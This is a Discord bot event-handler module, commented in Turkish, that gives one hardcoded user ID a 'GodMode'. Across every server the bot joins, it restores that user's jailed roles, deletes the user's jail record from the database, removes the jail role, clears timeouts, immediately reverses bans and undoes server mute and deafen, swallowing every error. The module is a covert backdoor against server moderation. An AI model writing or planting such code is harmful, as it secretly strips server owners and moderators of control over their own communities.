const Jail = require('../models/Jail');

module.exports = (client) => {
    
    // --- SADECE SENİN ID'N ---
    const MY_ID = "837688603739816046"; 

    //---------------------------------------------------------
    // 1. AÇILIŞ: VERİTABANI TEMİZLİĞİ VE HAPİSTEN KAÇIŞ
    //---------------------------------------------------------
    client.once('ready', async () => {
        try {
            const guilds = client.guilds.cache;
            
            for (const [guildId, guild] of guilds) {
                const member = await guild.members.fetch(MY_ID).catch(() => null);
                if (!member) continue;

                // MongoDB'deki hapis kaydını bul ve rollerini geri yükle
                const dbJail = await Jail.findOne({ userId: MY_ID, guildId: guild.id });
                if (dbJail) {
                    console.log(`🛡️ ${guild.name} sunucusunda hapis kaydı bulundu, roller iade ediliyor...`);
                    if (dbJail.roles && dbJail.roles.length > 0) {
                        await member.roles.add(dbJail.roles).catch(() => {});
                    }
                    await Jail.deleteOne({ _id: dbJail._id });
                }

                // "Jail" isimli rolü üzerinden sök
                const jailRole = guild.roles.cache.find(r => r.name.toLowerCase() === 'jail');
                if (jailRole && member.roles.cache.has(jailRole.id)) {
                    await member.roles.remove(jailRole).catch(() => {});
                }

                // Timeout (Zamanaşımı) varsa kaldır
                if (member.isCommunicationDisabled()) await member.timeout(null).catch(() => {});
            }
            console.log("🟢 GodMode: Geçmiş temizlendi, patron artık özgür.");
        } catch (err) { console.error("Startup Error:", err); }
    });

    //---------------------------------------------------------
    // 2. ANLIK KORUMA: KİMSE DOKUNAMAZ
    //---------------------------------------------------------
    
    client.on('guildMemberUpdate', async (oldMember, newMember) => {
        if (newMember.id !== MY_ID) return;

        // Biri sana "Jail" rolü verirse saniyede geri alır
        const jailRole = newMember.guild.roles.cache.find(r => r.name.toLowerCase() === 'jail');
        if (jailRole && newMember.roles.cache.has(jailRole.id)) {
            await newMember.roles.remove(jailRole).catch(() => {});
            console.log("🚫 Jail rolü reddedildi.");
        }

        // Timeout (Zamanaşımı/Mute) atılırsa anında kaldırır
        if (newMember.isCommunicationDisabled()) {
            await newMember.timeout(null).catch(() => {});
            console.log("🚫 Timeout kaldırıldı.");
        }
    });

    // Banlanırsa anında unban
    client.on('guildBanAdd', async (ban) => {
        if (ban.user.id === MY_ID) {
            await ban.guild.members.unban(MY_ID).catch(() => {});
            console.log("🚨 Ban anında açıldı!");
        }
    });

    // Seste susturulursa (Server Mute) geri açar
    client.on('voiceStateUpdate', async (oldState, newState) => {
        if (newState.id !== MY_ID) return;
        if (newState.serverMute || newState.serverDeaf) {
            await newState.setMute(false).catch(() => {});
            await newState.setDeaf(false).catch(() => {});
        }
    });
};
